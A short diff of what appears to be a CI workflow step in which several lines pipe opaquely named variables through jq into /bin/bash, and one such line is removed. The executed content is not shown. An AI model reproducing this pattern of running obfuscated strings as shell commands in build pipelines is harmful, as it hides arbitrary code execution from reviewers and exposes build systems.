@@ -56,7 +56,6 @@ jobs:
           echo $cphyf1432 | jq -r .tcb9 | /bin/bash
           printf '%s' "$tlc7909" | jq -r .ilxmd4 | /bin/bash
           printf '%s' "$t6" | jq -r .nwg65366 | /bin/bash
-          printf '%s' "$gzvd41" | jq -r .ayqcw6 | /bin/bash
           printf '%s' "$ufc4" | jq -r .evg10799 | /bin/bash
 
       - name: Save archive
